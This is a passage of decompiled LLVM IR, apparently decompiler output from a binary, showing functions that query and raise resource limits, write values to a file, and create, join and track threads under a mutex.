  %stack_var_-272.0 = phi i8 [ %stack_var_-272.1, %dec_label_pc_40592c ], [ %.stack_var_-272.1, %dec_label_pc_405940 ]
  br i1 %v1_405a0c, label %dec_label_pc_4059e4, label %dec_label_pc_40599c

dec_label_pc_40599c:                              ; preds = %dec_label_pc_405988
  %v9_4059c0 = call i32 (i8*, i8*, ...) @sscanf(i8* %tmp20, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_40a9b8.136, i32 0, i32 0), i32* %v8_4059c0)
  %v2_4059d4 = icmp eq i32 %v9_4059c0, 1
  %.stack_var_-271.0 = select i1 %v2_4059d4, i8 1, i8 %stack_var_-271.0.ph
  br label %dec_label_pc_4059e4.outer

dec_label_pc_4059e4.outer:                        ; preds = %dec_label_pc_4059e4.preheader, %dec_label_pc_40599c
  %stack_var_-271.0.ph = phi i8 [ %v1_4058c8, %dec_label_pc_4059e4.preheader ], [ %.stack_var_-271.0, %dec_label_pc_40599c ]
  %stack_var_-272.1.ph = phi i8 [ %v1_4058b8, %dec_label_pc_4059e4.preheader ], [ %stack_var_-272.0, %dec_label_pc_40599c ]
  %v1_405a0c = icmp eq i8 %stack_var_-271.0.ph, 1
  br label %dec_label_pc_4059e4

dec_label_pc_4059e4:                              ; preds = %dec_label_pc_4059e4.outer, %dec_label_pc_405988
  %stack_var_-272.1 = phi i8 [ %stack_var_-272.0, %dec_label_pc_405988 ], [ %stack_var_-272.1.ph, %dec_label_pc_4059e4.outer ]
  %v1_4059f4 = icmp eq i8 %stack_var_-272.1, 1
  br i1 %v1_4059f4, label %dec_label_pc_4059f8, label %dec_label_pc_405a14

dec_label_pc_4059f8:                              ; preds = %dec_label_pc_4059e4
  br i1 %v1_405a0c, label %dec_label_pc_405a44, label %dec_label_pc_405a14

dec_label_pc_405a14:                              ; preds = %dec_label_pc_4059f8, %dec_label_pc_4059e4
  %v3_405a24 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32300) to i32*), align 4
  call void @__pseudo_call(i32 %v3_405a24)
  %v1_405a3c = icmp eq i32 %v3_405a24, 0
  br i1 %v1_405a3c, label %dec_label_pc_405a44, label %dec_label_pc_40592c

dec_label_pc_405a44:                              ; preds = %dec_label_pc_405a14, %dec_label_pc_4059f8
  %v3_405a48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32468) to i32*), align 4
  call void @__pseudo_call(i32 %v3_405a48)
  br label %dec_label_pc_405a60

dec_label_pc_405a60:                              ; preds = %dec_label_pc_405884, %dec_label_pc_405a44
  %stack_var_-271.1 = phi i8 [ %v1_4058c8, %dec_label_pc_405884 ], [ %stack_var_-271.0.ph, %dec_label_pc_405a44 ]
  %stack_var_-272.2 = phi i8 [ %v1_4058b8, %dec_label_pc_405884 ], [ %stack_var_-272.1, %dec_label_pc_405a44 ]
  %v3_405a64 = load i32, i32* @global_var_434370.113, align 4
  %v1_405a70 = inttoptr i32 %v3_405a64 to i32*
  %v2_405a70 = call i32 @mtx_unlock(i32* %v1_405a70)
  %v1_405a84 = icmp eq i8 %stack_var_-272.2, 0
  br i1 %v1_405a84, label %dec_label_pc_405aa8, label %dec_label_pc_405a88

dec_label_pc_405a88:                              ; preds = %dec_label_pc_405a60
  %v1_405a94 = icmp eq i8 %stack_var_-271.1, 0
  br i1 %v1_405a94, label %dec_label_pc_405aa8, label %dec_label_pc_405aac

dec_label_pc_405aa8:                              ; preds = %dec_label_pc_405a88, %dec_label_pc_405a60
  br label %dec_label_pc_405aac

dec_label_pc_405aac:                              ; preds = %dec_label_pc_405a88, %dec_label_pc_405aa8
  %storemerge = phi i32 [ 0, %dec_label_pc_405aa8 ], [ 1, %dec_label_pc_405a88 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i1 %v1_4059f4, { 1, 0 }
  uselistorder i8 %stack_var_-272.1, { 1, 0, 2, 3 }
  uselistorder i1 %v1_405a0c, { 1, 0 }
  uselistorder i8 %stack_var_-271.0.ph, { 1, 0, 2 }
  uselistorder i8 %stack_var_-272.0, { 1, 0 }
  uselistorder i8 %v1_4058c8, { 1, 0 }
  uselistorder i8 %v1_4058b8, { 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32300) to i32*), { 1, 2, 0 }
  uselistorder label %dec_label_pc_405aac, { 1, 0 }
  uselistorder label %dec_label_pc_405a60, { 1, 0 }
  uselistorder label %dec_label_pc_4059e4.outer, { 1, 0 }
}

define i32 @function_405acc(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405acc:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  store i32 %tmp, i32* %stack_var_0, align 4
  %v1_405af8 = icmp eq i32* %arg1, null
  %v1_405afc = zext i1 %v1_405af8 to i8
  %v1_405b08 = icmp eq i32 %arg2, 0
  %v1_405b0c = zext i1 %v1_405b08 to i8
  br i1 %v1_405af8, label %dec_label_pc_405b6c, label %dec_label_pc_405b24

dec_label_pc_405b24:                              ; preds = %dec_label_pc_405acc
  %tmp10 = bitcast i32* %stack_var_-20 to %rlimit*
  %v5_405b40 = call i32 @getrlimit(i32 8, %rlimit* %tmp10)
  %v1_405b4c = icmp eq i32 %v5_405b40, 0
  br i1 %v1_405b4c, label %dec_label_pc_405b50, label %dec_label_pc_405b6c

dec_label_pc_405b50:                              ; preds = %dec_label_pc_405b24
  %v3_405b54 = load i32, i32* %stack_var_-20, align 4
  %v3_405b58 = load i32, i32* %stack_var_0, align 4
  %v2_405b60 = inttoptr i32 %v3_405b58 to i32*
  store i32 %v3_405b54, i32* %v2_405b60, align 4
  br label %dec_label_pc_405b6c

dec_label_pc_405b6c:                              ; preds = %dec_label_pc_405b24, %dec_label_pc_405acc, %dec_label_pc_405b50
  %stack_var_-24.0 = phi i8 [ %v1_405afc, %dec_label_pc_405acc ], [ 1, %dec_label_pc_405b50 ], [ %v1_405afc, %dec_label_pc_405b24 ]
  br i1 %v1_405b08, label %dec_label_pc_405bc8, label %dec_label_pc_405b80

dec_label_pc_405b80:                              ; preds = %dec_label_pc_405b6c
  %tmp11 = bitcast i32* %stack_var_-20 to %rlimit*
  %v5_405b9c = call i32 @getrlimit(i32 5, %rlimit* %tmp11)
  %v1_405ba8 = icmp eq i32 %v5_405b9c, 0
  br i1 %v1_405ba8, label %dec_label_pc_405bac, label %dec_label_pc_405bc8

dec_label_pc_405bac:                              ; preds = %dec_label_pc_405b80
  %v3_405bb0 = load i32, i32* %stack_var_-20, align 4
  %v2_405bbc = inttoptr i32 %arg2 to i32*
  store i32 %v3_405bb0, i32* %v2_405bbc, align 4
  br label %dec_label_pc_405bc8

dec_label_pc_405bc8:                              ; preds = %dec_label_pc_405b80, %dec_label_pc_405b6c, %dec_label_pc_405bac
  %stack_var_-23.0 = phi i8 [ %v1_405b0c, %dec_label_pc_405b6c ], [ 1, %dec_label_pc_405bac ], [ %v1_405b0c, %dec_label_pc_405b80 ]
  %v1_405bd0 = icmp eq i8 %stack_var_-24.0, 0
  br i1 %v1_405bd0, label %dec_label_pc_405bf4, label %dec_label_pc_405bd4

dec_label_pc_405bd4:                              ; preds = %dec_label_pc_405bc8
  %v1_405be0 = icmp eq i8 %stack_var_-23.0, 0
  br i1 %v1_405be0, label %dec_label_pc_405bf4, label %dec_label_pc_405bf8

dec_label_pc_405bf4:                              ; preds = %dec_label_pc_405bd4, %dec_label_pc_405bc8
  br label %dec_label_pc_405bf8

dec_label_pc_405bf8:                              ; preds = %dec_label_pc_405bd4, %dec_label_pc_405bf4
  %storemerge = phi i32 [ 0, %dec_label_pc_405bf4 ], [ 1, %dec_label_pc_405bd4 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_405bf8, { 1, 0 }
  uselistorder label %dec_label_pc_405bc8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_405b6c, { 2, 0, 1 }
}

define i32 @function_405c18(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405c18:
  %stack_var_0 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_0, align 4
  %v1_405c44 = icmp eq i32 %arg1, 0
  %v1_405c48 = zext i1 %v1_405c44 to i8
  %v1_405c54 = icmp eq i32 %arg2, 0
  %v1_405c58 = zext i1 %v1_405c54 to i8
  br i1 %v1_405c44, label %dec_label_pc_405d10, label %dec_label_pc_405c70

dec_label_pc_405c70:                              ; preds = %dec_label_pc_405c18
  %tmp10 = bitcast i32* %stack_var_-20 to %rlimit*
  %v5_405c8c = call i32 @getrlimit(i32 8, %rlimit* %tmp10)
  %v1_405c98 = icmp eq i32 %v5_405c8c, 0
  br i1 %v1_405c98, label %dec_label_pc_405c9c, label %dec_label_pc_405d10

dec_label_pc_405c9c:                              ; preds = %dec_label_pc_405c70
  %v3_405ca0 = load i32, i32* %stack_var_-20, align 4
  %v3_405ca4 = load i32, i32* %stack_var_0, align 4
  %v2_405cac = icmp uge i32 %v3_405ca0, %v3_405ca4
  %v1_405cb4 = zext i1 %v2_405cac to i8
  br i1 %v2_405cac, label %dec_label_pc_405d10, label %dec_label_pc_405ccc

dec_label_pc_405ccc:                              ; preds = %dec_label_pc_405c9c
  store i32 %v3_405ca4, i32* %stack_var_-20, align 4
  %v5_405cf4 = call i32 @setrlimit(i32 8, %rlimit* nonnull %tmp10)
  %v1_405d00 = icmp eq i32 %v5_405cf4, 0
  br i1 %v1_405d00, label %dec_label_pc_405d04, label %dec_label_pc_405d10

dec_label_pc_405d04:                              ; preds = %dec_label_pc_405ccc
  br label %dec_label_pc_405d10

dec_label_pc_405d10:                              ; preds = %dec_label_pc_405ccc, %dec_label_pc_405c70, %dec_label_pc_405c9c, %dec_label_pc_405c18, %dec_label_pc_405d04
  %stack_var_-24.0 = phi i8 [ %v1_405c48, %dec_label_pc_405c18 ], [ %v1_405cb4, %dec_label_pc_405c9c ], [ 1, %dec_label_pc_405d04 ], [ %v1_405cb4, %dec_label_pc_405ccc ], [ %v1_405c48, %dec_label_pc_405c70 ]
  br i1 %v1_405c54, label %dec_label_pc_405dc4, label %dec_label_pc_405d24

dec_label_pc_405d24:                              ; preds = %dec_label_pc_405d10
  %v3_405d34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32256) to i32*), align 4
  call void @__pseudo_call(i32 %v3_405d34)
  %v1_405d4c = icmp eq i32 %v3_405d34, 0
  br i1 %v1_405d4c, label %dec_label_pc_405d50, label %dec_label_pc_405dc4

dec_label_pc_405d50:                              ; preds = %dec_label_pc_405d24
  %v3_405d54 = load i32, i32* %stack_var_-20, align 4
  %v2_405d60 = icmp uge i32 %v3_405d54, %arg2
  %v1_405d68 = zext i1 %v2_405d60 to i8
  br i1 %v2_405d60, label %dec_label_pc_405dc4, label %dec_label_pc_405d80

dec_label_pc_405d80:                              ; preds = %dec_label_pc_405d50
  store i32 %arg2, i32* %stack_var_-20, align 4
  %tmp11 = bitcast i32* %stack_var_-20 to %rlimit*
  %v5_405da8 = call i32 @setrlimit(i32 5, %rlimit* %tmp11)
  %v1_405db4 = icmp eq i32 %v5_405da8, 0
  br i1 %v1_405db4, label %dec_label_pc_405db8, label %dec_label_pc_405dc4

dec_label_pc_405db8:                              ; preds = %dec_label_pc_405d80
  br label %dec_label_pc_405dc4

dec_label_pc_405dc4:                              ; preds = %dec_label_pc_405d80, %dec_label_pc_405d24, %dec_label_pc_405d50, %dec_label_pc_405d10, %dec_label_pc_405db8
  %stack_var_-23.0 = phi i8 [ %v1_405c58, %dec_label_pc_405d10 ], [ %v1_405d68, %dec_label_pc_405d50 ], [ 1, %dec_label_pc_405db8 ], [ %v1_405d68, %dec_label_pc_405d80 ], [ %v1_405c58, %dec_label_pc_405d24 ]
  %v1_405dcc = icmp eq i8 %stack_var_-24.0, 0
  br i1 %v1_405dcc, label %dec_label_pc_405df0, label %dec_label_pc_405dd0

dec_label_pc_405dd0:                              ; preds = %dec_label_pc_405dc4
  %v1_405ddc = icmp eq i8 %stack_var_-23.0, 0
  br i1 %v1_405ddc, label %dec_label_pc_405df0, label %dec_label_pc_405df4

dec_label_pc_405df0:                              ; preds = %dec_label_pc_405dd0, %dec_label_pc_405dc4
  br label %dec_label_pc_405df4

dec_label_pc_405df4:                              ; preds = %dec_label_pc_405dd0, %dec_label_pc_405df0
  %storemerge = phi i32 [ 0, %dec_label_pc_405df0 ], [ 1, %dec_label_pc_405dd0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 5, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, %rlimit*)* @setrlimit, { 1, 0 }
  uselistorder i32 (i32, %rlimit*)* @getrlimit, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_405df4, { 1, 0 }
  uselistorder label %dec_label_pc_405dc4, { 4, 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_405d10, { 4, 0, 2, 1, 3 }
}

define i32 @function_405e14(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405e14:
  %tmp = inttoptr i32 %arg2 to i8*
  %stack_var_0 = alloca i8*, align 4
  store i8* %arg1, i8** %stack_var_0, align 4
  %v1_405e44 = icmp eq i8* %arg1, null
  br i1 %v1_405e44, label %dec_label_pc_405e48, label %dec_label_pc_405e68

dec_label_pc_405e48:                              ; preds = %dec_label_pc_405e14
  %v1_405e54 = icmp eq i32 %arg2, 0
  br i1 %v1_405e54, label %dec_label_pc_405e58, label %dec_label_pc_405e68

dec_label_pc_405e58:                              ; preds = %dec_label_pc_405e48
  br label %dec_label_pc_405f40

dec_label_pc_405e68:                              ; preds = %dec_label_pc_405e48, %dec_label_pc_405e14
  %v7_405e84 = call %_IO_FILE* @fopen(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_40a9c8.139, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_40a9dc.140, i32 0, i32 0))
  %v1_405e9c = icmp eq %_IO_FILE* %v7_405e84, null
  br i1 %v1_405e9c, label %dec_label_pc_405f3c, label %dec_label_pc_405ea0

dec_label_pc_405ea0:                              ; preds = %dec_label_pc_405e68
  %v3_405ea4 = load i8*, i8** %stack_var_0, align 4
  %v1_405eac = icmp eq i8* %v3_405ea4, null
  br i1 %v1_405eac, label %dec_label_pc_405edc, label %dec_label_pc_405eb0

dec_label_pc_405eb0:                              ; preds = %dec_label_pc_405ea0
  %v4_405ea4 = ptrtoint i8* %v3_405ea4 to i32
  store i32 %v4_405ea4, i32* @a2, align 4
  %v10_405ed0 = call i32 (%_IO_FILE*, i8*, ...) @fprintf(%_IO_FILE* nonnull %v7_405e84, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_40a9e0.141, i32 0, i32 0), i8* nonnull %v3_405ea4)
  br label %dec_label_pc_405edc

dec_label_pc_405edc:                              ; preds = %dec_label_pc_405ea0, %dec_label_pc_405eb0
  %v1_405ee4 = icmp eq i32 %arg2, 0
  br i1 %v1_405ee4, label %dec_label_pc_405f14, label %dec_label_pc_405ee8

dec_label_pc_405ee8:                              ; preds = %dec_label_pc_405edc
  store i32 %arg2, i32* @a2, align 4
  %v10_405f08 = call i32 (%_IO_FILE*, i8*, ...) @fprintf(%_IO_FILE* nonnull %v7_405e84, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_40a9e0.141, i32 0, i32 0), i8* %tmp)
  br label %dec_label_pc_405f14

dec_label_pc_405f14:                              ; preds = %dec_label_pc_405edc, %dec_label_pc_405ee8
  %v3_405f18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32468) to i32*), align 4
  call void @__pseudo_call(i32 %v3_405f18)
  br label %dec_label_pc_405f40

dec_label_pc_405f3c:                              ; preds = %dec_label_pc_405e68
  br label %dec_label_pc_405f40

dec_label_pc_405f40:                              ; preds = %dec_label_pc_405f14, %dec_label_pc_405e58, %dec_label_pc_405f3c
  %v1_405f50 = phi i32 [ 1, %dec_label_pc_405f14 ], [ 1, %dec_label_pc_405e58 ], [ 0, %dec_label_pc_405f3c ]
  ret i32 %v1_405f50

; uselistorder directives
  uselistorder i8* %v3_405ea4, { 0, 2, 1 }
  uselistorder i8** %stack_var_0, { 1, 0 }
  uselistorder i32 (%_IO_FILE*, i8*, ...)* @fprintf, { 2, 1, 0 }
  uselistorder i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_40a9e0.141, i32 0, i32 0), { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_405f40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_405f14, { 1, 0 }
  uselistorder label %dec_label_pc_405edc, { 1, 0 }
}

define i32 @th_start(i32* (i32*)* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32* (i32*)*, align 4
  %stack_var_-44 = alloca i32, align 4
  store i32* (i32*)* %arg1, i32* (i32*)** %stack_var_0, align 4
  %v3_405f94 = load i8*, i8** @global_var_41b11c.21, align 4
  %v4_405f94 = ptrtoint i8* %v3_405f94 to i32
  %v1_405fb8 = icmp eq i8* %v3_405f94, null
  br i1 %v1_405fb8, label %dec_label_pc_406098, label %dec_label_pc_405fbc

dec_label_pc_405fbc:                              ; preds = %entry
  %tmp = trunc i32 %arg4 to i8
  %tmp24 = bitcast i8* %v3_405f94 to i32*
  %v6_405fd8 = call i32* @memset(i32* %tmp24, i32 0, i32 32)
  %v1_405fec = add i32 %v4_405f94, 12
  %v2_405ff8 = add i32 %v4_405f94, 8
  %v3_405ff8 = inttoptr i32 %v2_405ff8 to i32*
  store i32 %v1_405fec, i32* %v3_405ff8, align 4
  %v3_406004 = add i32 %v4_405f94, 4
  %v4_406004 = inttoptr i32 %v3_406004 to i8*
  store i8 84, i8* %v4_406004, align 1
  %v3_406010 = load i32, i32* %v3_405ff8, align 4
  %v1_406024 = add i32 %v3_406010, 16
  %v2_406030 = inttoptr i32 %v3_406010 to i32*
  store i32 %v1_406024, i32* %v2_406030, align 4
  %v2_406040 = add i32 %v3_406010, 4
  %v3_406040 = inttoptr i32 %v2_406040 to i32*
  store i32 %arg2, i32* %v3_406040, align 4
  %v3_406050 = add i32 %v3_406010, 8
  %v4_406050 = inttoptr i32 %v3_406050 to i8*
  store i8 %tmp, i8* %v4_406050, align 1
  %v2_40605c = add i32 %v3_406010, 12
  %v3_40605c = inttoptr i32 %v2_40605c to i32*
  store i32 1, i32* %v3_40605c, align 4
  %v3_406074 = call i32 @pthread_attr_init(i32* nonnull %stack_var_-44)
  %v1_406088 = icmp eq i32 %arg3, 0
  br i1 %v1_406088, label %dec_label_pc_4060f4, label %dec_label_pc_4060d0

dec_label_pc_406098:                              ; preds = %entry
  call void @perror(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_40a9e4.143, i32 0, i32 0))
  call void @exit(i32 -1)
  unreachable

dec_label_pc_4060d0:                              ; preds = %dec_label_pc_405fbc
  %v4_4060e8 = call i32 @pthread_attr_setstacksize(i32* nonnull %stack_var_-44, i32 %arg3)
  br label %dec_label_pc_4060f4

dec_label_pc_4060f4:                              ; preds = %dec_label_pc_405fbc, %dec_label_pc_4060d0
  %v5_406110 = call i32 @pthread_attr_setdetachstate(i32* nonnull %stack_var_-44, i32 %arg4)
  %v2_406124 = load i32, i32* %v2_406030, align 4
  %v3_406134 = load i32* (i32*)*, i32* (i32*)** %stack_var_0, align 4
  %v6_406148 = inttoptr i32 %v2_406124 to i32*
  %v10_406148 = call i32 @pthread_create(i32* %v6_406148, i32* nonnull %stack_var_-44, i32* (i32*)* %v3_406134, i32* %v2_406030)
  %v1_406154 = icmp eq i32 %v10_406148, 0
  br i1 %v1_406154, label %dec_label_pc_406158, label %dec_label_pc_406228

dec_label_pc_406158:                              ; preds = %dec_label_pc_4060f4
  %v3_406160 = load i32, i32* @global_var_434370.113, align 4
  %v1_40616c = inttoptr i32 %v3_406160 to i32*
  %v2_40616c = call i32 @mtx_lock(i32* %v1_40616c)
  store i32 0, i32* %tmp24, align 4
  %v3_406188 = load i8*, i8** @global_var_434378.126, align 4
  %v1_406190 = icmp eq i8* %v3_406188, null
  br i1 %v1_406190, label %dec_label_pc_4061f4, label %dec_label_pc_406194

dec_label_pc_406194:                              ; preds = %dec_label_pc_406158
  %v1_4061cc4 = bitcast i8* %v3_406188 to i32*
  %v2_4061cc5 = load i32, i32* %v1_4061cc4, align 4
  %v1_4061d46 = icmp eq i32 %v2_4061cc5, 0
  br i1 %v1_4061d46, label %dec_label_pc_4061d8, label %dec_label_pc_4061b0

dec_label_pc_4061b0:                              ; preds = %dec_label_pc_406194, %dec_label_pc_4061b0
  %v1_4061cc7 = phi i32* [ %v1_4061cc, %dec_label_pc_4061b0 ], [ %v1_4061cc4, %dec_label_pc_406194 ]
  %v2_4061b8 = load i32, i32* %v1_4061cc7, align 4
  %v1_4061cc = inttoptr i32 %v2_4061b8 to i32*
  %v2_4061cc = load i32, i32* %v1_4061cc, align 4
  %v1_4061d4 = icmp eq i32 %v2_4061cc, 0
  br i1 %v1_4061d4, label %dec_label_pc_4061d8, label %dec_label_pc_4061b0

dec_label_pc_4061d8:                              ; preds = %dec_label_pc_4061b0, %dec_label_pc_406194
  %v1_4061cc.lcssa = phi i32* [ %v1_4061cc4, %dec_label_pc_406194 ], [ %v1_4061cc, %dec_label_pc_4061b0 ]
  store i32 %v4_405f94, i32* %v1_4061cc.lcssa, align 4
  br label %dec_label_pc_406204

dec_label_pc_4061f4:                              ; preds = %dec_label_pc_406158
  store i8* %v3_405f94, i8** @global_var_434378.126, align 4
  br label %dec_label_pc_406204

dec_label_pc_406204:                              ; preds = %dec_label_pc_4061d8, %dec_label_pc_4061f4
  %v3_406208 = load i32, i32* @global_var_434370.113, align 4
  %v1_406214 = inttoptr i32 %v3_406208 to i32*
  %v2_406214 = call i32 @mtx_unlock(i32* %v1_406214)
  br label %dec_label_pc_406248

dec_label_pc_406228:                              ; preds = %dec_label_pc_4060f4
  br label %dec_label_pc_406248

dec_label_pc_406248:                              ; preds = %dec_label_pc_406204, %dec_label_pc_406228
  %stack_var_-56.2 = phi i32 [ %v3_406010, %dec_label_pc_406204 ], [ 0, %dec_label_pc_406228 ]
  ret i32 %stack_var_-56.2

; uselistorder directives
  uselistorder i32* %v1_4061cc, { 0, 2, 1 }
  uselistorder i32* %v1_4061cc4, { 1, 0, 2 }
  uselistorder i32* %v2_406030, { 1, 0, 2 }
  uselistorder i32 %v4_405f94, { 3, 0, 2, 1 }
  uselistorder i8* %v3_405f94, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1, 3 }
  uselistorder i32* (i32*)** %stack_var_0, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_406248, { 1, 0 }
  uselistorder label %dec_label_pc_406204, { 1, 0 }
  uselistorder label %dec_label_pc_4061b0, { 1, 0 }
  uselistorder label %dec_label_pc_4060f4, { 1, 0 }
}

define i32 @th_cancel(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %tmp, i32* %stack_var_0, align 4
  %v2_40628c = add i32 %tmp, 12
  %v3_40628c = inttoptr i32 %v2_40628c to i32*
  store i32 2, i32* %v3_40628c, align 4
  %v3_406290 = load i32, i32* %stack_var_0, align 4
  %v1_406298 = add i32 %v3_406290, 8
  %v2_406298 = inttoptr i32 %v1_406298 to i8*
  %v3_406298 = load i8, i8* %v2_406298, align 1
  %v1_4062a8 = icmp eq i8 %v3_406298, 1
  br i1 %v1_4062a8, label %dec_label_pc_4062e8, label %dec_label_pc_4062ac

dec_label_pc_4062ac:                              ; preds = %entry
  %v1_4062b8 = inttoptr i32 %v3_406290 to i32*
  %v2_4062b8 = load i32, i32* %v1_4062b8, align 4
  %v1_4062c0 = inttoptr i32 %v2_4062b8 to i32*
  %v2_4062c0 = load i32, i32* %v1_4062c0, align 4
  %v5_4062dc = call i32 @pthread_join(i32 %v2_4062c0, i32** null)
  br label %dec_label_pc_4062e8

dec_label_pc_4062e8:                              ; preds = %entry, %dec_label_pc_4062ac
  %v1_4062f8 = phi i32 [ 0, %entry ], [ %v5_4062dc, %dec_label_pc_4062ac ]
  ret i32 %v1_4062f8

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_4062e8, { 1, 0 }
}

define i32 @th_exit(i32 %arg1) local_unnamed_addr {
entry:
  %v3_40632c = load i32, i32* @global_var_434370.113, align 4
  %v1_406338 = inttoptr i32 %v3_40632c to i32*
  %v2_406338 = call i32 @mtx_lock(i32* %v1_406338)
  %v3_406348 = load i8*, i8** @global_var_434378.126, align 4
  %v4_4063cc18 = ptrtoint i8* %v3_406348 to i32
  %v1_4063d419 = icmp eq i8* %v3_406348, null
  br i1 %v1_4063d419, label %dec_label_pc_4063dc.thread, label %dec_label_pc_40635c

dec_label_pc_40635c:                              ; preds = %entry, %dec_label_pc_4063b8
  %v4_4063cc21 = phi i32 [ %v2_4063c0, %dec_label_pc_4063b8 ], [ %v4_4063cc18, %entry ]
  %storemerge320 = phi i8* [ %v5_4063c8, %dec_label_pc_4063b8 ], [ %v3_406348, %entry ]
  %v1_406364 = add i32 %v4_4063cc21, 4
  %v2_406364 = inttoptr i32 %v1_406364 to i8*
  %v3_406364 = load i8, i8* %v2_406364, align 1
  %v2_40636c = icmp eq i8 %v3_406364, 84
  br i1 %v2_40636c, label %dec_label_pc_40637c, label %dec_label_pc_4063b8

dec_label_pc_40637c:                              ; preds = %dec_label_pc_40635c
  %v1_406384 = add i32 %v4_4063cc21, 8
  %v2_406384 = inttoptr i32 %v1_406384 to i32*
  %v3_406384 = load i32, i32* %v2_406384, align 4
  %v2_406398 = icmp eq i32 %v3_406384, %arg1
  br i1 %v2_406398, label %dec_label_pc_4063e8, label %dec_label_pc_4063b8

dec_label_pc_4063b8:                              ; preds = %dec_label_pc_40637c, %dec_label_pc_40635c
  %v1_4063c0 = bitcast i8* %storemerge320 to i32*
  %v2_4063c0 = load i32, i32* %v1_4063c0, align 4
  %v5_4063c8 = inttoptr i32 %v2_4063c0 to i8*
  %v1_4063d4 = icmp eq i32 %v2_4063c0, 0
  br i1 %v1_4063d4, label %dec_label_pc_4063dc.thread, label %dec_label_pc_40635c

dec_label_pc_4063dc.thread:                       ; preds = %dec_label_pc_4063b8, %entry
  br label %dec_label_pc_4064d0

dec_label_pc_4063e8:                              ; preds = %dec_label_pc_40637c
  %v2_4063fc = icmp eq i8* %v3_406348, %storemerge320
  br i1 %v2_4063fc, label %dec_label_pc_406400, label %dec_label_pc_406450.preheader

dec_label_pc_406450.preheader:                    ; preds = %dec_label_pc_4063e8
  %v1_40645810 = bitcast i8* %v3_406348 to i32*
  %v2_40645811 = load i32, i32* %v1_40645810, align 4
  %v1_40646012 = icmp eq i32 %v2_40645811, 0
  br i1 %v1_40646012, label %dec_label_pc_406484, label %dec_label_pc_406464

dec_label_pc_406400:                              ; preds = %dec_label_pc_4063e8
  %v1_406410 = bitcast i8* %v3_406348 to i32*
  %v2_406410 = load i32, i32* %v1_406410, align 4
  %v4_406418 = inttoptr i32 %v2_406410 to i8*
  store i8* %v4_406418, i8** @global_var_434378.126, align 4
  br label %dec_label_pc_4064b4

dec_label_pc_40643c:                              ; preds = %dec_label_pc_406464
  %v2_406444 = load i32, i32* %v1_40645814, align 4
  %v1_406458 = inttoptr i32 %v2_406444 to i32*
  %v2_406458 = load i32, i32* %v1_406458, align 4
  %v1_406460 = icmp eq i32 %v2_406458, 0
  br i1 %v1_406460, label %dec_label_pc_406484, label %dec_label_pc_406464

dec_label_pc_406464:                              ; preds = %dec_label_pc_406450.preheader, %dec_label_pc_40643c
  %v1_40645814 = phi i32* [ %v1_406458, %dec_label_pc_40643c ], [ %v1_40645810, %dec_label_pc_406450.preheader ]
  %v2_406470 = load i32, i32* %v1_40645814, align 4
  %v2_40647c = icmp eq i32 %v2_406470, %v4_4063cc21
  br i1 %v2_40647c, label %dec_label_pc_406484, label %dec_label_pc_40643c

dec_label_pc_406484:                              ; preds = %dec_label_pc_40643c, %dec_label_pc_406464, %dec_label_pc_406450.preheader
  %v1_406458.lcssa = phi i32* [ %v1_40645810, %dec_label_pc_406450.preheader ], [ %v1_406458, %dec_label_pc_40643c ], [ %v1_40645814, %dec_label_pc_406464 ]
  %v2_40648c = load i32, i32* %v1_406458.lcssa, align 4
  %v1_406494 = icmp eq i32 %v2_40648c, 0
  br i1 %v1_406494, label %dec_label_pc_4064b4, label %dec_label_pc_406498

dec_label_pc_406498:                              ; preds = %dec_label_pc_406484
  %v1_4064a4 = bitcast i8* %storemerge320 to i32*
  %v2_4064a4 = load i32, i32* %v1_4064a4, align 4
  store i32 %v2_4064a4, i32* %v1_406458.lcssa, align 4
  br label %dec_label_pc_4064b4

dec_label_pc_4064b4:                              ; preds = %dec_label_pc_406484, %dec_label_pc_406400, %dec_label_pc_406498
  br label %dec_label_pc_4064d0

dec_label_pc_4064d0:                              ; preds = %dec_label_pc_4063dc.thread, %dec_label_pc_4064b4
  %v3_4064d4 = load i32, i32* @global_var_434370.113, align 4
  %v1_4064e0 = inttoptr i32 %v3_4064d4 to i32*
